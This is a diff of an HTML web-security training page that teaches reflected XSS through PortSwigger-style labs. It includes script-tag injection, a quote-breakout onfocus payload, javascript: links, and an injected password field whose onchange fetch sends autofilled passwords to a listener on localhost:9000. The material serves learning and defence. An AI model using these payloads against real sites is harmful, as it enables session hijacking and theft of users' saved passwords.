@@ -464,48 +464,41 @@ document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div></div>
 
         <h3 id="attribute-breakout">Why <code>&lt;script&gt;</code> works in Lab #1 but fails in Lab #3 (Press <code>Ctrl+U</code>)</h3>
         <p class="lab-lead">
-          When you search for a word on a site, the server often echoes your input in <strong>two places</strong> in the raw HTML (press <code>Ctrl+U</code> to View Page Source): inside the <code>&lt;h1&gt;</code> heading, and inside the search box's <code>&lt;input value="…"&gt;</code> attribute so the box remembers what you typed.
+          When you search on a site, your input often lands in <strong>two places</strong> in the raw HTML (press <code>Ctrl+U</code>): inside the <code>&lt;h1&gt;</code> heading, and inside the search box's <code>&lt;input value="…"&gt;</code> attribute.
         </p>
         <div class="comparison-grid" style="margin-bottom:var(--space-4);">
           <div class="comparison-card comparison-card--cyan">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title">Scenario A: <code>&lt;</code> and <code>&gt;</code> NOT Encoded</h3>
-              <span class="comparison-badge" style="color:var(--color-cyan);">PortSwigger Lab #1 &amp; #2</span>
+              <h3 class="comparison-card__title">Scenario A: <code>&lt; &gt;</code> NOT Encoded</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">Lab #1 &amp; #2</span>
             </div>
             <div class="terminal-window" style="margin:var(--space-2) 0;">
               <div class="terminal-window__body"><pre><code>&lt;!-- 1. Server template (Ctrl+U): --&gt;
 &lt;h1&gt;0 search results for 'YOUR_INPUT'&lt;/h1&gt;
 
-&lt;!-- 2. You type: --&gt;
-&lt;script&gt;alert(1)&lt;/script&gt;
-
-&lt;!-- 3. Browser receives &amp; runs: --&gt;
+&lt;!-- 2. Inject &lt;script&gt;alert(1)&lt;/script&gt;: --&gt;
 &lt;h1&gt;0 search results for '&lt;script&gt;alert(1)&lt;/script&gt;'&lt;/h1&gt;</code></pre></div>
             </div>
             <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0;">
-              Because the server sends literal <code>&lt;</code> and <code>&gt;</code> characters, the browser opens a brand-new <code>&lt;script&gt;</code> tag and executes <code>alert(1)</code>.
+              Literal <code>&lt;</code> and <code>&gt;</code> characters arrive unencoded, so the browser opens a new <code>&lt;script&gt;</code> tag and executes <code>alert(1)</code>.
             </p>
           </div>
 
           <div class="comparison-card comparison-card--accent">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title">Scenario B: <code>&lt;</code> and <code>&gt;</code> Encoded to <code>&amp;lt; &amp;gt;</code></h3>
-              <span class="comparison-badge" style="color:var(--color-accent);">PortSwigger Lab #3</span>
+              <h3 class="comparison-card__title">Scenario B: <code>&lt; &gt;</code> Encoded</h3>
+              <span class="comparison-badge" style="color:var(--color-accent);">Lab #3</span>
             </div>
             <div class="terminal-window" style="margin:var(--space-2) 0;">
-              <div class="terminal-window__body"><pre><code>&lt;!-- 1. &lt;script&gt; becomes harmless &amp;lt;script&amp;gt; in &lt;h1&gt;,
-        so check the search &lt;input&gt; in Ctrl+U: --&gt;
+              <div class="terminal-window__body"><pre><code>&lt;!-- 1. Search &lt;input&gt; in Ctrl+U: --&gt;
 &lt;input name="search" value="YOUR_INPUT"&gt;
 
-&lt;!-- 2. You type (zero &lt; or &gt; needed!): --&gt;
-" autofocus onfocus=alert(1) x="
-
-&lt;!-- 3. Browser receives &amp; runs on load: --&gt;
+&lt;!-- 2. Inject: " autofocus onfocus=alert(1) x=" --&gt;
 &lt;input name="search" value=""
   autofocus onfocus=alert(1) x=""&gt;</code></pre></div>
             </div>
             <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0;">
-              The developer encoded <code>&lt;</code> and <code>&gt;</code> (so you can't open a new tag), <strong>but forgot to encode <code>"</code></strong>! Your first <code>"</code> closes <code>value="</code> early and turns <code>autofocus onfocus=alert(1)</code> into real attributes on the <code>&lt;input&gt;</code> tag.
+              <code>&lt;script&gt;</code> turns into harmless <code>&amp;lt;script&amp;gt;</code> in <code>&lt;h1&gt;</code>, <strong>but <code>"</code> is not encoded</strong>! Your first <code>"</code> closes <code>value="</code> and attaches <code>autofocus onfocus=alert(1)</code> onto the <code>&lt;input&gt;</code> tag.
             </p>
           </div>
         </div>
@@ -564,54 +557,42 @@ document.cookie = 'token=PASTE_STOLEN_JWT_HERE';</code></pre></div></div>
 
         <h3 id="modern-traps">What if <code>&lt;</code>, <code>&gt;</code>, AND <code>"</code> are ALL encoded? (Modern 2020s Traps)</h3>
         <p class="lab-lead">
-          Modern frameworks (React, Angular) and careful developers HTML-encode angle brackets (<code>&amp;lt; &amp;gt;</code>) <strong>and</strong> double quotes (<code>&amp;quot;</code>). That blocks Scenario A (you can't open a <code>&lt;script&gt;</code> tag) and blocks Scenario B (you can't close <code>value="</code> with a quote). Here are two ways modern apps still get owned:
+          When an app encodes angle brackets <strong>and</strong> quotes, you can't open a new tag (Scenario A) and you can't break out of <code>value="</code> (Scenario B). Here are two ways modern apps still get owned:
         </p>
 
         <div class="comparison-grid" style="margin-bottom:var(--space-4);">
           <div class="comparison-card comparison-card--cyan">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title">2020s Trap 1: <code>javascript:</code> Links</h3>
-              <span class="comparison-badge" style="color:var(--color-cyan);">PortSwigger Lab #4</span>
+              <h3 class="comparison-card__title">Trap 1: <code>javascript:</code> Links</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">Lab #4</span>
             </div>
             <div class="terminal-window" style="margin:var(--space-2) 0;">
-              <div class="terminal-window__body"><pre><code>&lt;!-- 1. Comment author link in Ctrl+U
-        (&lt;, &gt;, and " are ALL encoded!): --&gt;
+              <div class="terminal-window__body"><pre><code>&lt;!-- 1. Link in Ctrl+U (&lt; &gt; " all encoded): --&gt;
 &lt;a id="author" href="YOUR_WEBSITE"&gt;Alice&lt;/a&gt;
 
-&lt;!-- 2. You enter this as your Website URL: --&gt;
-javascript:alert(1)
-
-&lt;!-- 3. Browser renders &amp; runs when clicked: --&gt;
+&lt;!-- 2. Enter javascript:alert(1) as URL: --&gt;
 &lt;a id="author" href="javascript:alert(1)"&gt;Alice&lt;/a&gt;</code></pre></div>
             </div>
             <ul class="comparison-list" style="margin-top:var(--space-2);">
-              <li><span class="comparison-icon">1️⃣</span> <strong>How links normally work:</strong> An <code>&lt;a href="https://…"&gt;</code> tag navigates to a web page when clicked.</li>
-              <li><span class="comparison-icon">2️⃣</span> <strong>The <code>javascript:</code> feature:</strong> Browsers have a built-in rule: if an <code>href</code> (or <code>&lt;iframe src=…&gt;</code>) starts with <code>javascript:</code> instead of <code>https://</code>, <strong>clicking the link runs that JavaScript code</strong> on the current page!</li>
-              <li><span class="comparison-icon">3️⃣</span> <strong>Why HTML-encoding fails here:</strong> Look at <code>javascript:alert(1)</code>. There is <strong>not a single <code>&lt;</code>, <code>&gt;</code>, or <code>"</code> character in it</strong>, so HTML-encoding leaves it 100% untouched!</li>
+              <li><span class="comparison-icon">🔗</span> If an <code>href</code> starts with <code>javascript:</code> instead of <code>https://</code>, clicking the link runs that code on the page.</li>
+              <li><span class="comparison-icon">🛡️</span> <code>javascript:alert(1)</code> has <strong>zero <code>&lt;</code>, <code>&gt;</code>, or <code>"</code> characters</strong>, so HTML-encoding leaves it 100% untouched!</li>
             </ul>
           </div>
 
           <div class="comparison-card comparison-card--accent">
             <div class="comparison-card__header">
-              <h3 class="comparison-card__title">2020s Trap 2: Password-Manager Autofill Theft</h3>
-              <span class="comparison-badge" style="color:var(--color-accent);">steals saved password</span>
+              <h3 class="comparison-card__title">Trap 2: Autofill Password Theft</h3>
+              <span class="comparison-badge" style="color:var(--color-accent);">steals password</span>
             </div>
             <div class="terminal-window" style="margin:var(--space-2) 0;">
-              <div class="terminal-window__body"><pre><code>&lt;!-- 1. Inject fake login inputs via XSS: --&gt;
+              <div class="terminal-window__body"><pre><code>&lt;!-- Inject onto the page via XSS: --&gt;
 &lt;input name="email"&gt;
 &lt;input type="password"
-  onchange="fetch('http://localhost:9000/?pw='+this.value)"&gt;
-
-&lt;!-- 2. Browser password manager sees localhost:3000
-        and auto-fills the victim's saved password! --&gt;
-
-&lt;!-- 3. onchange fires and sends their plaintext
-        password to your port 9000 listener! --&gt;</code></pre></div>
+  onchange="fetch('http://localhost:9000/?pw='+this.value)"&gt;</code></pre></div>
             </div>
             <ul class="comparison-list" style="margin-top:var(--space-2);">
-              <li><span class="comparison-icon">1️⃣</span> <strong>The scenario:</strong> Suppose the session cookie is locked inside <code>HttpOnly</code> and you want the victim's <strong>actual plaintext password</strong>.</li>
-              <li><span class="comparison-icon">2️⃣</span> <strong>How password managers work:</strong> Chrome and Safari check the page's domain (<code>localhost:3000</code>). Whenever they see <code>&lt;input name="email"&gt;</code> and <code>&lt;input type="password"&gt;</code> on that domain, they automatically fill in the user's saved credentials.</li>
-              <li><span class="comparison-icon">3️⃣</span> <strong>The heist:</strong> As soon as the browser auto-fills the password box, <code>onchange</code> fires and ships <code>this.value</code> (their plaintext password) to your terminal!</li>
+              <li><span class="comparison-icon">🔑</span> Browser password managers trust the domain (<code>localhost:3000</code>) and auto-fill any <code>&lt;input type="password"&gt;</code> on the page.</li>
+              <li><span class="comparison-icon">📡</span> Even if cookies are <code>HttpOnly</code>, <code>onchange</code> ships <code>this.value</code> (their saved plaintext password) to port <code>9000</code>!</li>
             </ul>
           </div>
         </div>
